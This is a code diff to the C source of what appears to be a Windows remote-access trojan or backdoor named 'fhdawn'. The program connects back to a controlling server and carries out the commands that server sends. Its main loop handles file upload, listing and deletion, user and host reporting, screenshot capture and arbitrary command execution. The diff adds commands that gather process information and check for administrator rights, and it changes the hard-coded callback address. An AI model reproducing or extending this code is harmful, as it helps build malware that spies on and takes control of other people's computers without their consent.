@@ -274,12 +274,12 @@ void fhdawn_main(void)
             } while (upload);
             
         }
-        
+        // send user / pc
         else if (strcmp(recvbuf, "fhdawn_host") == 0)
         {
             UserPC();
         }
-        
+        // list files in current directory
         else if (strcmp(recvbuf, "listdir") == 0)
         {
             WIN32_FIND_DATA data;
@@ -307,12 +307,12 @@ void fhdawn_main(void)
                 sockSend(dir);
             }
         } 
-        
+        // return dll output
         else if (strcmp(recvbuf, "dlloutput") == 0)
         {
             sockSend(GetInputOutput());
         }
-
+        // change directory
         else if (strcmp(recvbuf, "cd") == 0)
         {
             memset(recvbuf, '\0', BUFFER);
@@ -345,7 +345,8 @@ void fhdawn_main(void)
                 sockprintf(sockfd, "Directory Changed to '%s'", cDir());
             }
         } 
-
+        
+        // delete file
         else if (strstr(recvbuf, "delete") != NULL)
         {
             memset(fileinfo, '\0', 3);
@@ -366,9 +367,57 @@ void fhdawn_main(void)
             }
         }
 
+        // Capture screenshot
         else if (strcmp(recvbuf, "screenshot") == 0) {
             CaptureAnImage(GetDesktopWindow());
         }
+        
+        // Send process info
+        else if (strstr(recvbuf, "psinfo") != NULL)
+        {
+            memset(fileinfo, '\0', 3);
+            split(recvbuf, fileinfo, ":");
+            char FILEPATH[BUFFER];
+            memset(FILEPATH, '\0', BUFFER);
+            DWORD pid = ProcessId(fileinfo[1]);
+            HANDLE procHandle;
+            if (pid != 0)
+            {
+                procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+                if (procHandle != NULL) {
+                    if (GetModuleFileNameEx(procHandle, NULL, FILEPATH, MAX_PATH) != 0)
+                    {
+                        // Send Process name, pid, and path back
+                        sockprintf(sockfd, "PROCESS,%s,%ld,%s", fileinfo[1], pid, FILEPATH);
+                    }
+                    else {
+                        sockprintf(sockfd, "PROCESS,%s,%ld,(error : %ld)", fileinfo[1], pid, GetLastError());
+                    }
+                    CloseHandle(procHandle);
+                }
+                else {
+                    sockprintf(sockfd, "Failed to open Process : %s", fileinfo[1]);
+                }
+            }
+            else {
+                sockprintf(sockfd, "Process not running.");
+            }
+        }
+
+        // Send admin status
+
+        else if (strcmp(recvbuf, "isadmin") == 0)
+        {
+            if (IsAdmin())
+            {
+                sockprintf(sockfd, "ADMIN:TRUE");
+            }
+            else {
+                sockprintf(sockfd, "ADMIN:FALSE");
+            }
+
+        }
+
 
         else {
             ExecSock();
@@ -406,7 +455,7 @@ void MainConnect(void)
         exit(1);
     }
 
-    server.sin_addr.s_addr = inet_addr("192.168.0.107");
+    server.sin_addr.s_addr = inet_addr("127.0.0.1");
     server.sin_port = htons(421);
     server.sin_family = AF_INET;
 
